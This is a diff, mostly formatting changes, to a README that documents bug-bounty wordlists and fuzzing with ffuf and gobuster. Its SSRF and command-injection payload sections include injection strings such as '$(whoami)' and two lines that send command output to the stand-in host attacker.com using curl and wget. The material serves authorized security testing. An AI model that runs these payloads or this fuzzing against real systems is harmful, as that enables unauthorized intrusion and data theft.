@@ -2,28 +2,30 @@
 
 ## Overview
 
-This directory contains wordlists for fuzzing, subdomain enumeration, and parameter discovery. Wordlists are essential for effective bug bounty hunting.
+This directory contains wordlists for fuzzing, subdomain enumeration, and
+parameter discovery. Wordlists are essential for effective bug bounty
+hunting.
 
 ## Directory Structure
 
 ```
 config/wordlists/
 ├── fuzzing/                 # Directory and file fuzzing
-│   ├── common.txt         # dirb/common.txt style
-│   ├── raft-large.txt    # Large directory wordlist
-│   └── raft-small.txt    # Small focused wordlist
-├── parameters/            # Parameter discovery
-│   ├── params.txt        # Common parameter names
-│   └── param-verbose.txt # Extended parameter list
-├── subdomains/            # Subdomain enumeration
-│   ├── subdomains-top1mil.txt # Top 1M subdomains
-│   └── resolvers.txt     # DNS resolvers
-├── payloads/              # Attack payloads by type
-│   ├── xss.txt           # XSS payloads
-│   ├── sqli.txt          # SQL injection payloads
-│   ├── ssrf.txt          # SSRF payloads
-│   └── command-injection.txt # Command injection payloads
-└── README.md             # This file
+│   ├── common.txt           # dirb/common.txt style
+│   ├── raft-large.txt       # Large directory wordlist
+│   └── raft-small.txt       # Small focused wordlist
+├── parameters/              # Parameter discovery
+│   ├── params.txt           # Common parameter names
+│   └── param-verbose.txt    # Extended parameter list
+├── subdomains/              # Subdomain enumeration
+│   ├── subdomains-top1mil.txt  # Top 1M subdomains
+│   └── resolvers.txt        # DNS resolvers
+├── payloads/                # Attack payloads by type
+│   ├── xss.txt              # XSS payloads
+│   ├── sqli.txt             # SQL injection payloads
+│   ├── ssrf.txt             # SSRF payloads
+│   └── command-injection.txt  # Command injection payloads
+└── README.md                # This file
 ```
 
 ## Recommended Sources
@@ -76,7 +78,7 @@ ffuf -u https://target.com/FUZZ \
   -o recon/ffuf-recursive.json
 ```
 
-### Gobuster (DNS/Subdomain Bruteforce)
+### Gobuster (DNS / Subdomain Bruteforce)
 
 ```bash
 # Subdomain enumeration
@@ -168,7 +170,7 @@ amass enum -passive -brute \
 
 ### SSRF Payloads (config/wordlists/payloads/ssrf.txt)
 
-```bash
+```text
 http://localhost/
 http://127.0.0.1/
 http://127.1/
@@ -190,23 +192,18 @@ http://10.0.0.254/
 ; ls -la
 | whoami
 & whoami
-& amp; whoami
 `whoami`
 $(whoami)
-\nwhoami\n
 ; sleep 5
-&amp;amp; sleep 5
 ; curl https://attacker.com/?q=$(whoami)
 ; wget https://attacker.com/?q=$(whoami)
 ```
 
 ## Integration with /hunt
 
-The /hunt command uses these wordlists automatically:
+The `/hunt` command uses these wordlists automatically:
 
 ```bash
-# From bug-bounty-hunt workflow
-
 # ffuf for directory fuzzing
 ffuf -u https://{target}/FUZZ \
   -w config/wordlists/fuzzing/raft-small.txt \
@@ -237,7 +234,7 @@ head -20 config/wordlists/fuzzing/raft-small.txt
 ## Quick Reference
 
 | Tool | Wordlist Type | Location |
-|------|---------------|----------|
+|---|---|---|
 | ffuf | Directories | config/wordlists/fuzzing/ |
 | gobuster | Subdomains | config/wordlists/subdomains/ |
 | wfuzz | Parameters | config/wordlists/parameters/ |
